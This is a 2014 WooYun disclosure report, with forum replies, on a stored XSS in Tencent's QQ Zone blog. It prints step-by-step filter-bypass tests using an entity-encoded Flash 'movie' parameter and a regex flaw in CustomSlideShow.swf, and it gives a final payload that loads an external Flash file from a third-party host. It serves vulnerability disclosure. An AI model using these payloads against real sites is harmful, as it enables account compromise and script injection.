{"id": 5685, "wybug_id": "wooyun-2014-048992", "wybug_title": "QQ空间某功能缺陷导致日志存储型XSS - 13", "wybug_corp": "腾讯", "wybug_author": "gainover", "wybug_date": "2014-01-15 18:04", "wybug_open_date": "2014-03-01 18:05", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "技巧", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-01：\t细节向公众公开  简要描述： 很早之前就说要把之前录视频用的QQ空间日志XSS发到乌云上来的，但一直很忙。 今天下午好不容易挤点时间，重新测试了之前用的利用代码，却发现已经被腾讯修复了。。。。修复的很“精”准 T T ...  但是说出去的话，泼出去的水，只好临时再找一个来充数了。。于是只好于是乎，又跑去绕了绕腾讯修复的不是很好的FLASH文件，又绕了绕腾讯的富文本过滤器。。 详细说明：  很早之前就说要把之前录视频用的QQ空间日志XSS发到乌云上来的，但一直很忙。 今天下午好不容易挤点时间，重新测试了之前用的利用代码，却发现已经被腾讯修复了。。。。修复的很精准 T T ...  但是说出去的话，泼出去的水，只好再找一个来充数了。。于是只好于是乎，又跑去绕了绕腾讯修复的不是很好的FLASH文件，又绕了绕腾讯的过滤器。。1. 随便新建一个日志，插入一首歌，腾讯的音乐播放是通过FLASH完成的。 发表日志，接着我们查看日志的源代码。出来的内容大概是以下形式。\n<div class=\"blog_details_20120222\"><DIV><object codeBase=\"http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"410\" height=\"100\" src=\"http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\" bgcolor=\"#ffffff\" menu=\"true\" allowScriptAccess=\"always\" name=\"musicFlash**\" id=\"musicFlash0\" ubb=\"12985913|1|http://11.com/1.wma|bbbbbbb|0|aaaaaa|0\" class=\"blog_music\"><param name=\"movie\" value=\"http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\" /><param name=\"data\" value=\"http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\" /><param name=\"bgColor\" value=\"#ffffff\" /><param name=\"wmode\" value=\"transparent\" /><param name=\"menu\" value=\"true\" /><param name=\"allowScriptAccess\" value=\"always\" /></object></DIV></div>\n2. 由于腾讯对音乐播放器的处理，在IE和non-IE下有差异，以及浏览器对object标签的处理差异，本漏洞仅在IE下适用。3. 如果你对FLASH XSS比较熟悉的话，肯定能注意到，<param name=\"allowScriptAccess\" value=\"always\" />4. 眼前一亮有没有，但是当我们尝试去改变 movie 属性的时候， 眼睛就瞎了！ 因为腾讯肯定不会那么白痴的让你随便插FLASH地址么！跟着我的节奏，一起来！看看我的测试步骤。（有没有饶舌范！）测试1：\n<param name=\"movie\" value=\"http://xsst.sinaapp.com/Xss.swf\" />\t结果:\t<param name=\"movie\" value=\"http://xsst.sinaapp.com/Xss.swf\" /> 被直接删除掉\n测试2: (考虑是否是对value属性中的域名进行过滤)\n<param name=\"movie\" value=\"http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf\" />\t结果:\t<param name=\"movie\" value=\"http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf\" /> 成功。\t<param name=\"allowScriptAccess\" value=\"always\" /> 被替换为 <param name=\"allowScriptAccess\" value=\"never\" />\n由此可推测，腾讯会检测movie的value属性，从而决定是否更改allowscriptaccess的值！测试3: (基于测试2，考虑若干绕过方法，比如本测试会复写movie属性，绕过测试2的情况)\n<param name=\"movie\" value=\"http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf\" /> (前面放我们自己的)\t<param name=\"movie\" value=\"http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\" /> (后面放原始播放器地址)\t结果:\t依然被替换为\t<param name=\"allowScriptAccess\" value=\"always\" /> 被替换为 <param name=\"allowScriptAccess\" value=\"never\" />\n测试4： (在测试3的基础上，利用采用某方法成功绕过，但被腾讯修复。鉴于此方法还有利用余地，此帖不表。)测试5：（由于原有方法失效，只能换一种方法，达到和测试4类似效果，本法通过替换movie属性的名称为实体字符）\n<param name=\"mov&#105;e\" value=\"http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf\" />\t结果:\t<param name=\"mov&#105;e\" value=\"http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf\" /> 成功插入！\t<param name=\"allowScriptAccess\" value=\"always\" /> 未被替换！\n测试6: （检测测试5中的value属性是否可以插入任意FLASH地址）\n<param name=\"mov&#105;e\" value=\"http://xsst.sinaapp.com/Xss.swf\" />\t结果:\t<param name=\"mov&#105;e\" value=\"#\" /> 成功插入！\t<param name=\"allowScriptAccess\" value=\"always\" /> 未被替换！\n---------------------------------------------可见，到了测试5和测试6，我们已经可以成功插入qzs.qq.com域名下的FLASH，接着我们的任务就是在这个域名下找一个有缺陷的FLASH文件。这里我找到的是：http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf这个FLASH的bg参数存在缺陷。CustomSlideShow.swf 可以加载其它域名下的FLASH文件。为了给大家研究之便，我给出这个FLASH文件，之前版本的缺陷代码，已经现在版本的缺陷代码。前一个版本，对bg参数的过滤代码如下：\nif (_bgUrl){\t_bgUrl = _bgUrl.replace(/^(https?:)?\\/\\/.+?\\//, \"/\"); };\n绕过方式：http://qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf?bg=http://xsst.sinaapp.com//xsst.sinaapp.com/Xss.swf根据正则：http://xsst.sinaapp.com// -->被替换为-->   /http://xsst.sinaapp.com//xsst.sinaapp.com/Xss.swf  -->被替换为--> //xsst.sinaapp.com/Xss.swf但是在我今天进行测试的时候，发现腾讯已经对这种方式进行了修复，修复后的过滤代码如下：\nif (_bgUrl){\t_bgUrl = _bgUrl.replace(/^(https?:)?\\/\\/.+?\\/+/, \"/\");};\n这样一来，上面的绕过方式就不管用咯。但是呢，我们可以用更简单的方式绕过。http://xsst.sinaapp.com 就不会被过滤。 这正则的判断很狗血，有木有。。 我们只需要将  http://xsst.sinaapp.com 重定向至一个FLASH文件即可。也就是说，下面这样就可以加载外部FLASH文件了：http://qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf?bg=http://xsst.sinaapp.com--------------------最终利用代码：\n<div class=\"blog_details_20120222\"><DIV><object codeBase=\"http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"410\" height=\"100\" src=\"http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\" bgcolor=\"#ffffff\" menu=\"true\" allowScriptAccess=\"always\" name=\"musicFlash**\" id=\"musicFlash0\" ubb=\"12985913|1|http://11.com/1.wma|bbbbbbb|0|aaaaaa|0\" class=\"blog_music\"><param name='mov&#105;e'value='always' x=/\" value=\"http://edu.qzs.qq.com/qzone/client/photo/swf/CustomSlideShow.swf?bg=http://xsst.sinaapp.com\" /><param name=\"movie\" value=\"http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\" /><param name=\"data\" value=\"http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf\" /><param name=\"bgColor\" value=\"#ffffff\" /><param name=\"wmode\" value=\"transparent\" /><param name=\"menu\" value=\"true\" /><param name=\"allowScriptAccess\" value=\"always\" /></object></DIV></div>\n   漏洞证明：  测试环境： WIN7 + IE8\n\n具体细节见详细说明。   修复方案：  对日志的过滤器进行完善。对具有缺陷的FLASH进行修复。说太具体了，浪费精力。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-01-15 18:53 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-15 18:05 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  诈尸啊    \n     2014-01-15 18:06 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  复活啊    \n     2014-01-15 18:08 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  前排收wb，，，    \n     2014-01-15 18:08 |    \t\tRicter \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:15        | 渣渣一个)\t\t \n  略屌..    \n     2014-01-15 18:11 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  诈尸    \n     2014-01-15 18:40 |    \t\tAnonymous \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:30        | 园长是大傻逼)\t\t \n  二哥又发漏洞了    \n     2014-01-15 18:51 |    \t\tFocusstart \t\t\t( 普通白帽子  |\t\t\t        Rank:574 漏洞数:163        | 努力让某某某成为最幸福的女人！)\t\t \n  mark!    \n     2014-01-15 19:09 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  xss    \n     2014-01-15 19:59 |    \t\tHoerWing \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:4        | \"People should not be afraid of their go...)\t\t \n  二哥复活！！！！！！！！！！！！    \n     2014-01-15 20:22 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  又诈尸了    \n     2014-01-15 21:17 |    \t\t绝情刀 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:24        | .)\t\t \n  诈尸啊     \n     2014-01-15 21:35 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。原来还有十三额    \n     2014-01-15 21:45 |    \t\tSpid3r \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:10        | 常年撒网打鱼.)\t\t \n  一直是我心目中的二哥！    \n     2014-01-16 00:08 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  打算出第二季吗？    \n     2014-01-16 09:11 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  哦耶，切克闹！    \n     2014-01-16 09:12 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  这次发的是视频么！    \n     2014-01-16 09:31 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  第二季开始    \n     2014-01-16 11:25 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我擦啊    \n     2014-01-16 11:27 |    \t\tIvan \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:9        | 小菜逼一个)\t\t \n  二哥屌炸天    \n     2014-01-16 18:09 |    \t\tp0di \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 1+1 = 2 ？)\t\t \n  碉堡！    \n     2014-01-19 06:59 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  二哥，隔壁家的王寡妇说要你别找xss，回去帮他挑水呢~~~    \n     2014-01-21 09:47 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  惊现 二哥    \n     2014-01-22 17:25 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  我去，我以为再出肯定不再是空间了，没想到啊没想到so dickful you are，did your parents know it？    \n     2014-01-23 22:50 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  二哥好久不见了...    \n     2014-01-24 11:02 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xiaoL =。= 太忙了，都没什么空。。    \n     2014-02-17 13:36 |    \t\tIvan \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:9        | 小菜逼一个)\t\t \n  终于可见了~~    \n     2014-02-20 18:15 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  哈哈，这个正则确实硬伤了啊， /     \n     2014-03-01 19:08 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  原来这个漏洞的本质其实就是通过用name=movie用来定位value进行过滤器过滤额，然后把movie给htm编码后就不会被匹配到那个过滤器中了，然后always也就不会变为never了。好思路啊！    \n     2014-03-01 19:47 |    \t\t24jason \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:30        | 《算法导论》、《具体数学》……)\t\t \n  犀利极了。    \n     2014-09-20 19:59 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  cnt4    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}